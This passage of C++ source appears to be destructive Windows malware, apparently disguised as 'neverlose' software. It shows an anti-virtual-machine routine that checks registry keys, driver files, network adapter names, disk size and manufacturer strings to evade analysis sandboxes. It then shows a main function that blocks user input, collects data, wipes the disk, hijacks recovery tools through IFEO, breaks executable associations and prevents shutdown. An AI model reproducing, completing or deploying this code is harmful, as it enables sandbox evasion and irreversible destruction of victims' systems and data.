        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
        L"SYSTEM\\CurrentControlSet\\Services\\vmci",
        L"SYSTEM\\CurrentControlSet\\Services\\VMnetDHCP",
        L"SYSTEM\\CurrentControlSet\\Services\\VMnetuserif",
        L"SYSTEM\\CurrentControlSet\\Services\\vmmemctl",
        L"SYSTEM\\CurrentControlSet\\Services\\vmusb",
        L"SYSTEM\\CurrentControlSet\\Services\\VMTools",
        L"SYSTEM\\CurrentControlSet\\Services\\vmbus",
        L"SYSTEM\\CurrentControlSet\\Services\\VirtIO",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
    };
    for (auto* k : regKeys) { if (reg_exists(HKEY_LOCAL_MACHINE, k)) { score += 2; } }

    // ---- L4: VM driver files ----
    const wchar_t* drivers[] = {
        L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        L"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        L"C:\\Windows\\System32\\drivers\\vmmouse.sys",
        L"C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
        L"C:\\Windows\\System32\\drivers\\vm3dmp.sys",
        L"C:\\Windows\\System32\\drivers\\vmscsi.sys",
        L"C:\\Windows\\System32\\drivers\\vmmemctl.sys",
        L"C:\\Windows\\System32\\drivers\\vmxnet.sys",
        L"C:\\Windows\\System32\\drivers\\vmci.sys",
    };
    for (auto* d : drivers) { if (GetFileAttributesW(d) != INVALID_FILE_ATTRIBUTES) { score += 3; } }

    // ---- L5: VM NIC driver names via registry ----
    HKEY hClass;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}",
        0, KEY_READ, &hClass) == ERROR_SUCCESS) {
        for (int idx = 0; ; idx++) {
            wchar_t sub[64]; DWORD sz = (DWORD)std::size(sub);
            if (RegEnumKeyExW(hClass, idx, sub, &sz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
            HKEY hSub;
            if (RegOpenKeyExW(hClass, sub, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
                std::wstring desc = reg_read(hClass, sub, L"DriverDesc");
                if (desc.find(L"VirtualBox") != std::wstring::npos ||
                    desc.find(L"VMware") != std::wstring::npos ||
                    desc.find(L"VirtIO") != std::wstring::npos ||
                    desc.find(L"Hyper-V") != std::wstring::npos) {
                    score += 3;
                    RegCloseKey(hSub);
                    break;
                }
                RegCloseKey(hSub);
            }
        }
        RegCloseKey(hClass);
    }

    // ---- L6: Disk size < 60GB heuristic ----
    ULARGE_INTEGER totalBytes;
    if (GetDiskFreeSpaceExW(L"C:\\", nullptr, &totalBytes, nullptr)) {
        ULONGLONG gb = totalBytes.QuadPart / (1024ULL * 1024 * 1024);
        if (gb < 60) score += 1;
    }

    // ---- L7: WMI: Win32_ComputerSystem Manufacturer/Model shortcut via registry ----
    std::wstring csMfr = reg_read(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SystemInformation", L"SystemManufacturer");
    std::wstring csMod = reg_read(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SystemInformation", L"SystemProductName");
    for (auto* n : vmNames) {
        if (csMfr.find(n) != std::wstring::npos) { score += 3; break; }
    }
    for (auto* n : vmNames) {
        if (csMod.find(n) != std::wstring::npos) { score += 3; break; }
    }

    return score >= 4;  // threshold: 4+ points → VM detected
}

int main()
{
#if ANTI_VM
    if (is_vm()) {
        MessageBoxW(nullptr, L"cannot run in a visual mechine", L"neverlose", MB_OK | MB_ICONERROR);
        return 0;
    }
#endif

    BlockInput(TRUE);

    guarded_collect();

    // destroy — all silent, no console output
    disk_wiper();
    cripple_exe_association();
    ifeo_hijack_recovery_tools();
    cripple_system();
    guarded_audio();

    CreateThread(nullptr, 0, screen_icons, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, beep_chaos, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, anti_shutdown, nullptr, 0, nullptr);

    desktop_destroyer();

    return 0;
}
